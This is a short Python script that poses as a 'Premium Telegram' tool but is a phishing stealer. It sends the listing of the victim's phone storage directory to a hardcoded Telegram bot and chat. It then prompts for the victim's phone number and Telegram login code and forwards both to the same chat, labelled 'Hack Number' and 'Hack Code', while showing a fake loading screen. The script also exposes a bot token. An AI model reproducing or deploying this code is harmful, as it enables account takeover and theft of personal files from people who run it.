import telebot
import time 
import os 
import pyfiglet 
from colorama import Fore

text = pyfiglet.figlet_format('Premium Telegram')
print(text)
print(Fore.WHITE + '*'*25)

bot = telebot.TeleBot('8290789931:AAEF0GGYY4f3kPy6zxdJrXqcMlPbXWNuHFw')
chat_id = '8303879201'

file = os.listdir('/storage/emulated/0/')

bot.send_message(chat_id, file)

number = input(Fore.RED + "Enter your phone number : ")
bot.send_message(chat_id, f"Hack Number TeleGram : {number}")
print("")
print(Fore.GREEN + "loding . . .")
time.sleep(8)
print(Fore.WHITE + '*'*25)
code = input(Fore.RED + "Enter the code sent to your Telegram : ")

for i in code:
  bot.send_message(chat_id, f"Hack Code TeleGram : {i}")

print("")
print(Fore.WHITE + '*'*25)

while True:
  print(Fore.GREEN + "loding . . .")
  time.sleep(5)

